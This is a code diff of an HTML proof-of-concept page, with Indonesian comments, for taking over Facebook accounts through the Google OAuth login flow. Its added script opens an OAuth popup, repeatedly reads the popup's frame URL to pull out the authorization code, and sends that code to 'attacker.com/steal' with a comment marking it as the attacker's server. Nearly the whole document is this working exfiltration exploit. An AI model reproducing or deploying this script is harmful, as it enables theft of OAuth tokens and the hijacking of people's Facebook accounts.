@@ -4,23 +4,44 @@
     <title>POC ATO FACEBOOK</title>
 </head>
 <body>
-    <h1>POC</h1>
+    <h1>POC - Takeover Facebook Account</h1>
     
-    <a href="#" id="authLink">Klik disini untuk otorisasi</a>
+    <a href="#" id="authLink">Klik disini untuk memulai proses otorisasi</a>
     
     <script>
         document.getElementById('authLink').onclick = function() {
-            var win = window.open("https://accounts.google.com/o/oauth2/auth?redirect_uri=https://www.facebook.com/oauth2/redirect/&response_type=permission%20code%20id_token&scope=email%20profile%20openid&client_id=YOUR_CLIENT_ID");
+            // Buka jendela popup untuk otorisasi OAuth
+            var targetWindow = window.open("https://accounts.google.com/o/oauth2/auth?redirect_uri=https://www.facebook.com/oauth2/redirect/&response_type=permission%20code%20id_token&scope=email%20profile%20openid&client_id=YOUR_CLIENT_ID");
 
-            // Tunggu sampai popup ditutup
+            // Tunggu dan ambil kode OAuth dari jendela popup
             var checkPopup = setInterval(function() {
-                if (win.closed) {
-                    clearInterval(checkPopup);
-                    // Di sini, Anda bisa mendapatkan URL referer jika tersedia
-                    // Misalnya, dengan menggunakan XHR untuk mengakses halaman yang memuat referer
-                    // Anda mungkin perlu menyesuaikan dengan cara Anda mengelola token
+                try {
+                    // Periksa apakah jendela popup sudah ditutup
+                    if (targetWindow.closed) {
+                        clearInterval(checkPopup);
+                        console.log("Popup closed");
+                        return;
+                    }
+                    
+                    // Coba akses URL dari iframe di jendela popup
+                    var iframeUrl = targetWindow.frames[0].location.href;
+                    console.log("Iframe URL:", iframeUrl);
+
+                    // Ekstrak kode OAuth dari URL
+                    var urlParams = new URLSearchParams(new URL(iframeUrl).search);
+                    var oauthCode = urlParams.get('code');
+                    if (oauthCode) {
+                        console.log("OAuth Code:", oauthCode);
+                        // Kirim kode ke server penyerang
+                        var xhr = new XMLHttpRequest();
+                        xhr.open("GET", "https://attacker.com/steal?token=" + encodeURIComponent(oauthCode), true);
+                        xhr.send();
+                    }
+                } catch (e) {
+                    // Tangani kesalahan, biasanya karena pelanggaran SOP
+                    console.log("Error accessing iframe URL:", e);
                 }
-            }, 1000);
+            }, 1000); // Periksa setiap detik
         };
     </script>
 </body>
